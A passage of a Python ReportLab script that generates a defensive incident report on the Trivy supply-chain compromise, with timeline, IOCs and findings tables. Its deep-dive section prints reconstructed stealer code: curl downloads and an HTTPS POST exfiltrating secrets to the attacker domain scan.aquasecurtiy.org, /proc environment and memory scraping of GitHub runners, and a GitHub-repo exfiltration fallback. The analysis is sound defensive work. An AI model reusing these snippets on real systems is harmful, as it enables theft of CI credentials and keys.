        "<font name='Courier'>aquasec/trivy:0.69.4</font>, "
        "<font name='Courier'>0.69.5</font>, and "
        "<font name='Courier'>0.69.6</font> images directly to Docker Hub, "
        "<font name='Courier'>gcr.io/aquasecurity</font> (public), and "
        "AWS ECR Public — bypassing GitHub release automation entirely and proving "
        "that container registry credentials were also compromised [5]. StepSecurity confirmed "
        "the C2 domain was hardcoded in the binaries extracted from Docker images [5].",
        "<b>GPG Key Compromised:</b> The release workflow's GPG signing key (ID "
        "<font name='Courier'>E9D0A3616276FA6C</font>, created 2019) was written to disk in "
        "cleartext (<font name='Courier'>gpg.key</font>) during the build [3]. The same key is "
        "still published at <font name='Courier'>get.trivy.dev/rpm/public.key</font> and was "
        "never rotated. It must be considered compromised. RPM packages signed with this key "
        "can no longer be trusted [3].",
        "<b>npm Worm — CanisterWorm (Mar 20):</b> Using stolen npm tokens from compromised CI "
        "runners, a self-propagating worm infected packages across multiple npm scopes: "
        "@EmilGroup (28 packages), @opengov (16 packages), @teale.io, @airtm, and @pypestream "
        "in under 60 seconds [7]. The worm shared C2 "
        "infrastructure (ICP canister) with the Trivy payload [7].",
        "<b>kamikaze.sh Payloads (Mar 22):</b> The ICP canister fallback C2 served evolving "
        "payloads targeting Kubernetes environments (privileged DaemonSets, host escape), "
        "SSH/Docker worm spreading, and an Iran-targeted destructive wiper [7][8].",
        "<b>Internal Aqua Repos Defaced (Mar 22):</b> Using a compromised service account, the "
        "attacker published internal Aqua repositories publicly on GitHub, demonstrating "
        "continued access to the aquasecurity org [3].",
        "<b>Checkmarx KICS Compromised (Mar 23):</b> Same TTPs applied to Checkmarx ecosystem — "
        "35 KICS action versions redirected to malicious commits, with C2 at "
        "<font name='Courier'>checkmarx.zone</font> [5].",
    ]
    for item in subsequent:
        story.append(Paragraph(_cite_link(f"\u2022 {item}"), S_BULLET))
        story.append(Spacer(1, 2))

    story.append(Paragraph("2.6 Impact", S_H2))
    story.append(Paragraph(_cite_link(
        "Only secrets explicitly referenced in the workflow (via <font name='Courier'>"
        "${{ secrets.* }}</font>) are loaded into Runner.Worker memory [5]. If your workflow "
        "uses <font name='Courier'>secrets: inherit</font> to call a reusable workflow, all "
        "repository and org-level secrets are passed, but only those actually referenced "
        "in the reusable workflow are loaded into memory [5]. "
        "However, any secret the runner had access to should be assumed captured, including:"),
        S_BODY,
    ))
    impacts = [
        "The GITHUB_TOKEN (automatically available to every workflow)",
        "Any secret explicitly referenced via ${{ secrets.SECRET_NAME }}",
        "Organization-level secrets, but only if the workflow explicitly references them",
        "Cloud provider credentials (AWS, GCP, Azure) if referenced",
        "Container registry credentials and publish tokens",
        "SSH private keys and Git credentials accessible to the runner",
    ]
    for item in impacts:
        story.append(Paragraph(f"\u2022 {item}", S_BULLET))

    story.append(Spacer(1, 8))
    story.append(Paragraph("2.7 Secrets Exposed During the Release Build", S_H2))
    story.append(Paragraph(_cite_link(
        "The poisoned Release workflow passed several high-value secrets, all available to "
        "the imposter checkout's composite action [3]:"),
        S_BODY,
    ))
    secrets_table_headers = ["Secret", "Risk"]
    secrets_table_rows = [
        ["DOCKERHUB_USER / DOCKERHUB_TOKEN", "Push additional malicious images to Docker Hub"],
        ["ECR_ACCESS_KEY_ID / ECR_SECRET_ACCESS_KEY", "Push to any ECR repo accessible with these credentials"],
        ["GPG_KEY / GPG_PASSPHRASE", "Sign RPM packages as Aqua Security. The private key was written to disk "
         "in cleartext (gpg.key) during the build. Key ID: E9D0A3616276FA6C (created 2019), "
         "still published at get.trivy.dev/rpm/public.key. Never rotated; must be considered compromised."],
        ["ORG_REPO_TOKEN", "Cross-org access (likely the same or similar PAT as the one stolen in February)"],
    ]
    story.append(_make_table(secrets_table_headers, secrets_table_rows, col_widths=[140, 330]))
    story.append(Spacer(1, 8))

    story.append(Paragraph("2.8 Stolen PAT Scope Analysis", S_H2))
    story.append(Paragraph(_cite_link(
        "The attacker's actions reveal the stolen PAT had broad cross-repository "
        "permissions [3]. The cross-repo write access and discussion deletion capability "
        "strongly suggest this was an org-scoped PAT, not a repo-scoped credential [3]:"),
        S_BODY,
    ))
    pat_headers = ["Action", "Repository", "Required Permission"]
    pat_rows = [
        ["Push commits / create tags", "trivy", "contents: write"],
        ["Delete tags (v0.70.0)", "trivy", "contents: write"],
        ["Publish releases", "trivy", "contents: write"],
        ["Publish releases", "setup-trivy", "contents: write (cross-repo)"],
        ["Open PRs", "trivy-action", "pull_requests: write (cross-repo)"],
        ["Delete discussion #10265", "trivy", "discussions: write or admin"],
    ]
    story.append(_make_table(pat_headers, pat_rows, col_widths=[130, 100, 240]))
    story.append(Spacer(1, 8))

    story.append(Paragraph("2.9 Deception Techniques", S_H2))
    story.append(Paragraph(_cite_link(
        "The attacker employed numerous deception techniques to avoid detection [3]:"),
        S_BODY,
    ))
    deception_headers = ["Technique", "Details"]
    deception_rows = [
        ["Dangling/orphan commits", "Not on any branch; invisible to branch-based auditing"],
        ["Forged git author (DmitriyLewen)", "Blends into trivy's git log as a real maintainer"],
        ["Forged git author (rauchg)", "High-profile OSS contributor; plausible for actions/checkout"],
        ["Forged commit dates", "Backdated to look like routine maintenance"],
        ["Pin-by-SHA for checkout", "Looks like a security best practice, but points to malicious code"],
        ["--skip=validate on GoReleaser", "Single flag change, easy to overlook, essential for the poisoned build"],
        ["Quote-style YAML reformatting", "Cosmetic changes diluting the real modifications in diff noise"],
        ["Typosquat domain", "aquasecurtiy.org vs aquasecurity.org (swapped i and t)"],
        ["v0.69.4 (not v0.70.0)", "Blends into existing release series after botched first attempt"],
        ["Discussion deletion", "Removed community coordination thread (#10265)"],
        ["Spam bot flood", "47 accounts drowned signal in noise within 12 seconds"],
        [".golangci.yaml override", "Living Off The Pipeline (LOTP) technique to pass lint checks"],
        ["&> /dev/null on every curl", "Silently swallows errors from C2 downloads"],
    ]
    story.append(_make_table(deception_headers, deception_rows, col_widths=[130, 340]))

    story.append(PageBreak())

    # ── TECHNICAL DEEP DIVE ───────────────────────────────────────────────
    story.append(Paragraph("2.10 Technical Deep Dive: Exploit Code Analysis", S_H1))

    story.append(Paragraph("2.10.1 Imposter Checkout Action (actions/checkout @ 70379aad)", S_H2))
    story.append(Paragraph(_cite_link(
        "The imposter commit in <font name='Courier'>actions/checkout</font> replaced the "
        "legitimate Node.js action with a composite action [3]. After performing a real checkout "
        "via the parent commit, the composite action silently overwrote the Trivy source tree "
        "with malicious Go files downloaded from the C2 [3][4]:"),
        S_BODY,
    ))
    story.append(Paragraph(
        '- name: "Setup Checkout"<br/>'
        '  shell: bash<br/>'
        '  run: |<br/>'
        '    BASE="https://scan.aquasecurtiy.org/static"<br/>'
        '    curl -sSfL "$BASE/main.go" &gt; cmd/trivy/main.go &amp;&gt; /dev/null<br/>'
        '    curl -sSfL "$BASE/scand.go" &gt; cmd/trivy/scand.go &amp;&gt; /dev/null<br/>'
        '    curl -sSfL "$BASE/fork_unix.go" &gt; cmd/trivy/fork_unix.go &amp;&gt; /dev/null<br/>'
        '    curl -sSfL "$BASE/fork_windows.go" &gt; cmd/trivy/fork_windows.go &amp;&gt; /dev/null<br/>'
        '    curl -sSfL "$BASE/.golangci.yaml" &gt; .golangci.yaml &amp;&gt; /dev/null',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "Four Go files were dropped into <font name='Courier'>cmd/trivy/</font>, replacing "
        "legitimate source [3][4]. The filenames reveal their roles: "
        "<font name='Courier'>main.go</font> bootstrapped the malware before the real scanner, "
        "<font name='Courier'>scand.go</font> carried the credential-stealing logic, and "
        "<font name='Courier'>fork_unix.go</font>/<font name='Courier'>fork_windows.go</font> "
        "handled platform-specific persistence [7]. A fifth download replaced "
        "<font name='Courier'>.golangci.yaml</font> to suppress linter rules that would have "
        "flagged the injected code &mdash; a Living Off The Pipeline (LOTP) technique where "
        "golangci-lint's support for custom linter plugins via its config file is abused to "
        "ensure injected code passes CI checks cleanly [3]."),
        S_BODY,
    ))
    story.append(Spacer(1, 6))

    story.append(Paragraph("2.10.2 Release Workflow Diff (aquasecurity/trivy @ 1885610c)", S_H2))
    story.append(Paragraph(_cite_link(
        "The imposter commit in <font name='Courier'>aquasecurity/trivy</font> touched only "
        "two workflow files (<font name='Courier'>.github/workflows/release.yaml</font> and "
        "<font name='Courier'>reusable-release.yaml</font>) across 14 lines [3]. Most were noise "
        "(single quotes swapped for double quotes). Two lines mattered [3]:"),
        S_BODY,
    ))
    story.append(Paragraph(
        "1. The checkout SHA swap:",
        S_BODY,
    ))
    story.append(Paragraph(
        '-        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2<br/>'
        '+        uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0 # v6.0.2',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "The <font name='Courier'># v6.0.2</font> comment stayed. The SHA changed to point at "
        "the imposter composite action. This was designed to look like a routine pin update [3]."),
        S_BODY,
    ))
    story.append(Paragraph(
        "2. GoReleaser validation skip:",
        S_BODY,
    ))
    story.append(Paragraph(
        '+        run: goreleaser release --clean --timeout 90m --skip=validate',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "The <font name='Courier'>--skip=validate</font> flag told GoReleaser not to run "
        "integrity checks on build artifacts, which was essential because the poisoned source "
        "would produce binaries that don't match the expected checksums [3]."),
        S_BODY,
    ))
    story.append(Spacer(1, 6))

    story.append(Paragraph("2.10.3 Credential Stealer Code (entrypoint.sh / action.yaml)", S_H2))
    story.append(Paragraph(_cite_link(
        "The three-stage credential stealer was injected as 105 lines prepended to "
        "<font name='Courier'>entrypoint.sh</font> (trivy-action) and "
        "<font name='Courier'>action.yaml</font> (setup-trivy) [4][5]. The legitimate Trivy scanner "
        "code followed, so workflows completed successfully with normal output &mdash; nothing "
        "looked wrong unless you knew where to look [5]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Stage 1: Environment Harvesting</b>", S_H3))
    story.append(Paragraph(
        "The payload searched for four runner process names to cover all runner flavors:",
        S_BODY,
    ))
    story.append(Paragraph(
        'for _name in Runner.Worker Runner.Listener runsvc run.sh; do<br/>'
        '  _PIDS=$(pgrep -f "$_name" 2&gt;/dev/null || true)<br/>'
        '  [ -n "$_PIDS" ] &amp;&amp; _COLLECT_PIDS="$_COLLECT_PIDS $_PIDS"<br/>'
        'done',
        S_CODE,
    ))
    story.append(Paragraph(
        "For each process found, it read <font name='Courier'>/proc/PID/environ</font> "
        "(null-delimited environment variables converted to newlines via "
        "<font name='Courier'>tr '\\0' '\\n'</font>), filtering for keys matching "
        "<font name='Courier'>env</font> or <font name='Courier'>ssh</font>:",
        S_BODY,
    ))
    story.append(Paragraph(
        'if echo "$key" | grep -qiE \'(env|ssh)\'; then<br/>'
        '  printf \'%s=%s\\n\' "$key" "$val" &gt;&gt; "$COLLECTED"<br/>'
        '  if [ -f "$val" ] &amp;&amp; [ ! -S "$val" ]; then<br/>'
        '    cat "$val" &gt;&gt; "$COLLECTED"  # Read file contents if value is a path<br/>'
        '  fi<br/>'
        'fi',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "This catches variables like <font name='Courier'>SSH_PRIVATE_KEY</font>, "
        "<font name='Courier'>ENV_FILE</font>, etc. Critically, if the value is a file path "
        "(e.g., <font name='Courier'>SSH_KEY_PATH=/home/runner/.ssh/id_ed25519</font>), "
        "the script reads the file contents too &mdash; extracting the actual private key [4][5]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Stage 2: Memory Scraping (GitHub-hosted) / Filesystem Sweep (self-hosted)</b>", S_H3))
    story.append(Paragraph(
        "The code branches based on execution environment:",
        S_BODY,
    ))
    story.append(Paragraph(
        'if [[ "$(uname)" == "Linux" &amp;&amp; "$RUNNER_ENVIRONMENT" == "github-hosted" ]]; then<br/>'
        '    PYTHON_STR=\'aW1wb3J0IHN5cwppbXBvcnQgb3MK...\'  # base64-encoded Python<br/>'
        '    MEMORY_SECRETS=$(echo -n "$PYTHON_STR" | base64 -d | sudo python3 | \\<br/>'
        '      tr -d \'\\0\' | \\<br/>'
        '      grep -aoE \'"[^"]+":\\{"value":"[^"]*","isSecret":true\\}\' | sort -u)<br/>'
        'else<br/>'
        '    PYTHON_STR=\'aW1wb3J0IG9zLHN5cyxz...\'  # different base64 payload<br/>'
        '    SHELL_RUNNER_GOODIES=$(echo -n "$PYTHON_STR" | base64 -d | python3)<br/>'
        'fi',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "<b>GitHub-hosted path:</b> The decoded Python walks <font name='Courier'>/proc</font> "
        "to find the <font name='Courier'>Runner.Worker</font> process, reads its memory map "
        "from <font name='Courier'>/proc/PID/maps</font> to identify readable memory regions, "
        "then reads raw bytes from <font name='Courier'>/proc/PID/mem</font> [4][5]. It runs under "
        "<font name='Courier'>sudo</font> (GitHub-hosted runners have passwordless sudo). "
        "The output is piped through a regex matching GitHub Actions' internal secret storage "
        "format: <font name='Courier'>\"SECRET_NAME\":{\"value\":\"the_actual_secret\","
        "\"isSecret\":true}</font> [5]. The <font name='Courier'>***</font> masks in log output "
        "are cosmetic &mdash; the actual values exist in the runner process heap [5]."),
        S_BODY,
    ))
    story.append(Paragraph(_cite_link(
        "<b>Self-hosted path:</b> A comprehensive filesystem stealer (ending with the comment "
        "<font name='Courier'>## TeamPCP Cloud stealer</font>) systematically sweeps [4]: "
        "SSH keys and configs from every home directory and /etc/ssh; "
        "git credentials; AWS/GCP/Azure credentials; .env files walking up to 6 directories; "
        "cloud IMDS endpoints (both ECS and EC2); Kubernetes configs and service account tokens; "
        "Docker configs (including <font name='Courier'>/kaniko/.docker/config.json</font>); "
        "NPM tokens; Vault tokens; database credentials (MySQL/PostgreSQL/MongoDB/Redis); "
        "WireGuard configs; Terraform .tfvars and .tfstate; TLS private keys; "
        "Slack/Discord webhook URLs; cryptocurrency wallets (Bitcoin, Litecoin, Dogecoin, Zcash, "
        "Dash, Ripple, Monero, Ethereum, Cardano, Solana); and "
        "<font name='Courier'>/etc/passwd</font>, <font name='Courier'>/etc/shadow</font>, "
        "and auth logs."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Stage 3: Encryption &amp; Exfiltration</b>", S_H3))
    story.append(Paragraph(
        "The payload only proceeds if it found data "
        "(<font name='Courier'>-s \"$COLLECTED\"</font>). The encryption scheme:",
        S_BODY,
    ))
    story.append(Paragraph(
        'openssl rand 32 &gt; "$_SESSION_KEY"                    # Random 32-byte AES key<br/>'
        'openssl enc -aes-256-cbc -in "$COLLECTED" \\<br/>'
        '  -out "$_ENC_FILE" -pass "file:$_SESSION_KEY" -pbkdf2  # Encrypt data<br/>'
        'openssl pkeyutl -encrypt -pubin -inkey "$_PUB_KEY_PEM" \\<br/>'
        '  -in "$_SESSION_KEY" -out "$_ENC_KEY" \\<br/>'
        '  -pkeyopt rsa_padding_mode:oaep                        # Wrap session key with RSA-4096<br/>'
        'tar -czf "$_BUNDLE" -C "$_WORKDIR" payload.enc session.key.enc',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "A random 32-byte AES session key encrypts the collected data. The session key itself "
        "is encrypted with the attacker's embedded RSA-4096 public key using OAEP padding. "
        "Both ciphertext files are tarred into <font name='Courier'>tpcp.tar.gz</font> [4][5]. "
        "Only someone holding the corresponding RSA private key can reverse this."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Stage 4: Exfiltration with Fallback</b>", S_H3))
    story.append(Paragraph(
        "Primary channel &mdash; POST to C2 over HTTPS:",
        S_BODY,
    ))
    story.append(Paragraph(
        '_HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X POST \\<br/>'
        '  https://scan.aquasecurtiy.org \\<br/>'
        '  -H "Content-Type: application/octet-stream" \\<br/>'
        '  -H "X-Filename: tpcp.tar.gz" \\<br/>'
        '  --data-binary "@${_BUNDLE}")',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "If the C2 returns a non-2xx, and a GitHub PAT is available, the fallback creates a "
        "public repository on the victim's account [4][5]:"),
        S_BODY,
    ))
    story.append(Paragraph(
        'if [[ ! "$_HTTP" =~ ^2 ]] &amp;&amp; [ -n "${INPUT_GITHUB_PAT:-}" ]; then<br/>'
        '  _REPO="tpcp-docs"<br/>'
        '  curl -s -X POST "${_GH_API}/user/repos" \\<br/>'
        '    -H "$_GH_AUTH" \\<br/>'
        '    -d \'{"name":"\'${_REPO}\'","private":false,"auto_init":true}\'<br/>'
        '  # ... creates release, uploads tpcp.tar.gz as release asset<br/>'
        'fi',
        S_CODE,
    ))
    story.append(Paragraph(_cite_link(
        "The victim's own credentials are used to exfiltrate their own secrets via their own "
        "GitHub account in a public repository anyone can download from [4][5]. The attacker only "
        "needs to watch for new <font name='Courier'>tpcp-docs</font> repos appearing. "
        "Wiz also identified an additional Cloudflare Tunnel C2 at "
        "<font name='Courier'>plug-tab-protective-relay.trycloudflare.com</font>, providing "
        "yet another exfiltration path [7][8]."),
        S_BODY,
    ))
    story.append(Paragraph(_cite_link(
        "Finally, all temp files are cleaned up (<font name='Courier'>rm -rf</font>). "
        "The only trace: orphan <font name='Courier'>curl</font> processes killed by the "
        "runner at job cleanup: <font name='Courier'>Terminate orphan process: pid (2516) "
        "(curl)</font> [4]. Compromised runs show 1-4 of these depending on matrix job count [4]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("2.10.4 Malicious Binary Persistence (v0.69.4, non-CI)", S_H2))
    story.append(Paragraph(_cite_link(
        "When the compiled malicious trivy binary detected it was running outside GitHub "
        "Actions (<font name='Courier'>GITHUB_ACTIONS != \"true\"</font>), it installed a "
        "persistent backdoor [7]:"),
        S_BODY,
    ))
    story.append(Paragraph(
        "1. Dropped a base64-encoded Python script to "
        "<font name='Courier'>~/.config/systemd/user/sysmon.py</font><br/>"
        "2. Created a systemd user unit to run it persistently<br/>"
        "3. <font name='Courier'>sysmon.py</font> sleeps 5 minutes, then polls "
        "<font name='Courier'>https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io/</font> "
        "(an ICP canister &mdash; decentralized hosting)<br/>"
        "4. If a non-YouTube link is found (at the time of initial analysis, it was a RickRoll), "
        "the dropper downloads the payload to <font name='Courier'>/tmp/pglog</font> and "
        "executes it in a new session<br/>"
        "5. The ICP canister was later updated to serve <font name='Courier'>kamikaze.sh</font> "
        "payloads targeting Kubernetes environments",
        S_BODY,
    ))
    story.append(Paragraph(_cite_link(
        "The same ICP canister C2 was shared by the CanisterWorm npm worm, linking both "
        "attacks to the same TeamPCP infrastructure [7]. As of March 22, the ICP canister served "
        "evolving <font name='Courier'>kamikaze.sh</font> payloads with versions targeting [7][8]: "
        "v1 &mdash; Kubernetes privileged DaemonSets with host escape "
        "(<font name='Courier'>host-provisioner-std</font>) and an Iran-targeted wiper "
        "(<font name='Courier'>host-provisioner-iran</font>); "
        "v2 &mdash; Modular container (<font name='Courier'>kamikaze</font>) with "
        "<font name='Courier'>hostPID: true</font> for process namespace access; "
        "v3 &mdash; SSH/Docker worm scanning ports 22 and 2375 on the local /24, parsing "
        "<font name='Courier'>/var/log/auth.log</font> for targets, with self-deletion "
        "(<font name='Courier'>rm -- \"$0\"</font>). "
        "As of March 22 21:31 UTC, the ICP canister was made unavailable due to policy violation."),
        S_BODY,
    ))

    story.append(PageBreak())

    # ── 3. ATTACK FLOW DIAGRAM ────────────────────────────────────────────
    story.append(Paragraph("3. Attack Flow Diagram", S_H1))
    story.append(Spacer(1, 8))
    story.append(_build_attack_flow_diagram())
    story.append(Spacer(1, 12))
    story.append(Paragraph(_cite_link(
        "The diagram above illustrates the supply-chain attack flow. The attacker exploited "
        "incomplete remediation from the February 28 incident to gain access to the release "
        "automation [3][11], published a malicious trivy v0.69.4 binary, and injected credential stealers "
        "into trivy-action and setup-trivy via imposter commits originating from forks [3][5]. "
        "Downstream CI/CD pipelines that consumed these components had their secrets harvested "
        "from Runner.Worker process memory and exfiltrated to the C2 domain [4][5]."),
        S_BODY,
    ))
    story.append(PageBreak())

    # ── 4. EXPOSURE WINDOWS ───────────────────────────────────────────────
    story.append(Paragraph("4. Exposure Windows", S_H1))
    story.append(Paragraph(
        "The following table details the exposure windows for each affected component. "
        "Any workflow run that executed during these windows with the affected versions "
        "should be treated as potentially compromised.",
        S_BODY,
    ))
    story.append(Spacer(1, 8))

    ew_headers = ["Component", "Affected Versions", "NOT Affected", "Window (UTC)", "Duration"]
    ew_rows = [
        ["trivy",
         "v0.69.4, v0.69.5, v0.69.6 — GHCR, ECR Public, Docker Hub, GCR.io, APT/RPM, get.trivy.dev",
         "v0.69.3 or earlier; images by digest",
         "2026-03-19 18:22 – 2026-03-22",
         "~3 days"],
        ["trivy-action",
         "75 of 76 tags (0.0.1-0.34.2); version: latest during trivy window",
         "@0.35.0 (protected by immutable releases); SHA-pinned refs (safe SHA: 57a97c7e...)",
         "2026-03-19 ~17:43 \u2013 2026-03-20 ~05:40",
         "~12 hours"],
        ["setup-trivy",
         "All 7 tags (v0.1.0-v0.2.5); published via GitHub API at ~22:06 UTC",
         "SHA-pinned references; v0.2.6 (re-released clean)",
         "2026-03-19 ~17:43 – ~21:44",
         "~4 hours"],
    ]
    story.append(_make_table(ew_headers, ew_rows, col_widths=[60, 130, 110, 120, 50]))
    story.append(PageBreak())

    # ── 5. TIMELINE ───────────────────────────────────────────────────────
    story.append(Paragraph("5. Timeline &amp; Findings", S_H1))
    story.append(Spacer(1, 8))
    story.append(_build_timeline_diagram(findings))
    story.append(Paragraph(_cite_link(
        "<b>Note on Homebrew:</b> Homebrew's BrewTestBot automatically opened a PR to bump trivy "
        "to v0.69.4 (merged at ~19:36 UTC), but Homebrew builds from the source tarball, not "
        "from GitHub Actions artifacts [3][12]. The poisoned commit only modified workflow YAML files; the "
        "Go source code in the tarball was clean. Homebrew bottles were <b>not</b> backdoored [3]. "
        "The formula was still downgraded to v0.69.3 as a precaution [12]."),
        S_BODY,
    ))
    story.append(Spacer(1, 8))
    timeline_events = [
        ("2026-03-17", "Attacker registers typosquat domain aquasecurtiy.org via Spaceship, Inc.; Let's Encrypt certs for scan.aquasecurtiy.org issued within 50 minutes [4]."),
        ("2026-03-19 ~17:43 UTC", "aqua-bot pushes v0.69.4 tag to aquasecurity/trivy, triggering documentation deploy and release workflows. trivy-action and setup-trivy compromised via imposter commits / tag force-pushes [3][5]."),
        ("2026-03-19 ~17:51 UTC", "aqua-bot deletes v0.70.0 tag (botched first attempt with version that would raise alarms) [3]."),
        ("2026-03-19 ~18:22 UTC", "Compromised trivy v0.69.4 binary published to all registries (~40 min build time) [3][5]."),
        ("2026-03-19 ~18:30 UTC", "Automated helm chart bump PR #10416 opened for v0.69.4. Also, aqua-bot opens PR #538 on trivy-action to bump default Trivy version (closed without merging) [5]."),
        ("2026-03-19 ~21:07 UTC", "nikpivkin deletes compromised setup-trivy v0.2.5 tag [5]."),
        ("2026-03-19 ~21:34 UTC", "itaysk adds simar7 as collaborator on setup-trivy (incident response) [5]."),
        ("2026-03-19 ~21:43 UTC", "simar7 publishes clean setup-trivy v0.2.6 pointing to 3fb12ec [5]."),
        ("2026-03-19 ~21:50 UTC", "Helm chart bump PR #10416 closed (not merged) [5]."),
        ("2026-03-19 ~22:06 UTC", "aqua-bot publishes 7 releases on setup-trivy (v0.1.0-v0.2.5) in under 3 minutes via GitHub API [5]."),
        ("2026-03-19 ~22:13 UTC", "devinbfergy opens discussion #10420 asking why incident discussion was deleted [1]."),
        ("2026-03-19 ~23:05 UTC", "William Woodruff (Trail of Bits / Homebrew Security) files emergency downgrade PR #273304 [12]."),
        ("2026-03-19 ~23:13 UTC", "knqyf263 deletes compromised trivy v0.69.4 tag [5]."),
        ("2026-03-19 ~23:56 UTC", "bored-engineer confirms v0.69.4 compromised and shares IOCs from deleted discussion [8]."),
        ("2026-03-20 ~00:01 UTC", "Spam bots flood discussion #10420: taunts at 00:01, 47 generic praise comments in 12-second window at 00:08 [3]."),
        ("2026-03-20 ~05:40 UTC", "trivy-action fully remediated (last malicious tag removed). Aqua re-publishes all 74 releases in a 78-minute window [5]."),
        ("2026-03-22 ~16:00 UTC", "Attacker pushes malicious trivy v0.69.4, v0.69.5, v0.69.6 images to Docker Hub, GCR.io, and AWS ECR Public. Aqua internal repos published publicly [3][5]."),
    ]
    tl_headers = ["Time (UTC)", "Event"]
    story.append(_make_table(tl_headers, timeline_events, col_widths=[130, 340]))
    story.append(PageBreak())

    # ── 6. IOCs ───────────────────────────────────────────────────────────
    story.append(Paragraph("6. Indicators of Compromise (IOCs)", S_H1))

    # Collect all IOC matches from findings, grouped by type
    ioc_binary: set = set()
    ioc_network: set = set()
    ioc_workflow: set = set()
    for f in findings:
        if not f.ioc_match:
            continue
        for ioc in f.ioc_match.split(","):
            ioc = ioc.strip()
            if ioc.startswith("binary-sha256:"):
                ioc_binary.add(ioc.split(":", 1)[1])
            elif ioc.startswith("network:"):
                ioc_network.add(ioc.split(":", 1)[1])
            elif ioc.startswith("workflow-sha:"):
                parts = ioc.split(":")
                ioc_workflow.add(parts[-1] if len(parts) >= 3 else ioc)

    has_any_ioc = ioc_binary or ioc_network or ioc_workflow

    if not has_any_ioc:
        story.append(Paragraph(
            "<i>No IOC matches were observed in the scan findings. This section is intentionally "
            "empty because no binary hashes, network indicators, or malicious workflow commit SHAs "
            "matched the IOC databases for the scanned runs.</i>",
            S_BODY,
        ))
    else:
        if ioc_binary:
            story.append(Paragraph("6.1 Malicious Binary SHA-256 Hashes", S_H2))
            story.append(Paragraph(
                f"The following {len(ioc_binary)} malicious binary hash(es) were observed in scan findings:",
                S_BODY,
            ))
            for h in sorted(ioc_binary):
                story.append(Paragraph(h, S_CODE))
            story.append(Spacer(1, 8))

        if ioc_network:
            story.append(Paragraph(
                "6.2 Network IOCs" if ioc_binary else "6.1 Network IOCs", S_H2))
            story.append(Paragraph(
                f"The following {len(ioc_network)} network indicator(s) were observed in scan findings:",
                S_BODY,
            ))
            for n in sorted(ioc_network):
                story.append(Paragraph(n, S_CODE))
            story.append(Spacer(1, 8))

        if ioc_workflow:
            sub = "6.3" if (ioc_binary and ioc_network) else "6.2" if (ioc_binary or ioc_network) else "6.1"
            story.append(Paragraph(f"{sub} Malicious Workflow Commit SHAs", S_H2))
            story.append(Paragraph(
                f"The following {len(ioc_workflow)} malicious commit SHA(s) were observed in scan findings:",
                S_BODY,
            ))
            for s in sorted(ioc_workflow):
                story.append(Paragraph(s, S_CODE))

    story.append(PageBreak())

    # ── 7. AFFECTED REPOSITORIES ──────────────────────────────────────────
    story.append(Paragraph("7. Affected Repositories", S_H1))

    if not findings:
        story.append(Paragraph(
            "<i>No findings detected in this scan. No repositories appear affected.</i>",
            S_BODY,
        ))
    else:
        # Group by repo
        repo_findings: Dict[str, List[Finding]] = {}
        for f in findings:
            repo_findings.setdefault(f.repository, []).append(f)

        story.append(Paragraph(
            f"<b>{len(repo_findings)}</b> repositories had Trivy-related activity during the scan window.",
            S_BODY,
        ))
        story.append(Spacer(1, 8))

        repo_headers = ["Repository", "Findings", "CRITICAL", "HIGH", "MEDIUM", "Usage Types"]
        repo_rows = []
        for repo in sorted(repo_findings.keys(), key=str.lower):
            flist = repo_findings[repo]
            rc = sum(1 for x in flist if x.severity == "CRITICAL")
            rh = sum(1 for x in flist if x.severity == "HIGH")
            rm = sum(1 for x in flist if x.severity == "MEDIUM")
            types = sorted(set(x.usage_type for x in flist if x.usage_type))
            repo_rows.append([repo, str(len(flist)), str(rc), str(rh), str(rm), ", ".join(types)])
        story.append(_make_table(repo_headers, repo_rows, col_widths=[120, 50, 55, 40, 50, 155]))

    story.append(PageBreak())

    # ── 8. DETAILED FINDINGS ──────────────────────────────────────────────
    story.append(Paragraph("8. Detailed Findings", S_H1))

    if not findings:
        story.append(Paragraph("<i>No findings to report.</i>", S_BODY))
    else:
        sorted_findings = sorted(
            findings,
            key=lambda x: (-SEVERITY_RANK.get(x.severity, 0), x.run_time_utc or ""),
        )

        for idx, f in enumerate(sorted_findings, 1):
            sev_color = {"CRITICAL": "#d32f2f", "HIGH": "#f57c00", "MEDIUM": "#fbc02d"}.get(f.severity, "#757575")
            story.append(Paragraph(
                f'Finding {idx}: <font color="{sev_color}"><b>[{f.severity}]</b></font> '
                f'{f.repository} — Run {f.run_id}',
                S_H3,
            ))

            detail_rows = [
                ["Run Time (UTC)", f.run_time_utc or "—"],
                ["Workflow", f.workflow or "—"],
                ["Usage Type", f.usage_type or "—"],
                ["Action Ref", f.action_ref or "—"],
                ["Resolved SHA", f.resolved_sha or "—"],
                ["Version", f.version or "—"],
                ["IOC Match", f.ioc_match or "—"],
                ["Severity Trigger", f.severity_trigger or "—"],
            ]
            dt = _make_table(
                ["Field", "Value"], detail_rows,
                col_widths=[100, 370],
            )
            story.append(dt)

            if f.evidence_snippet:
                story.append(Spacer(1, 4))
                story.append(Paragraph("Evidence:", S_TD_BOLD))
                # Truncate very long snippets
                snippet = f.evidence_snippet[:600]
                if len(f.evidence_snippet) > 600:
                    snippet += "..."
                # Replace || separators with line breaks
                snippet = snippet.replace(" || ", "<br/>")
                story.append(Paragraph(snippet, S_CODE))

            story.append(Spacer(1, 10))

            # Page break every 4 findings to keep readable
            if idx % 4 == 0 and idx < len(sorted_findings):
                story.append(PageBreak())

    story.append(PageBreak())

    # ── 9. REMEDIATION ────────────────────────────────────────────────────
    story.append(Paragraph("9. Remediation Guidance", S_H1))

    story.append(Paragraph("9.1 Immediate Actions", S_H2))
    immediate = [
        "<b>Rotate all secrets</b> that were exposed as environment variables in affected CI runs. "
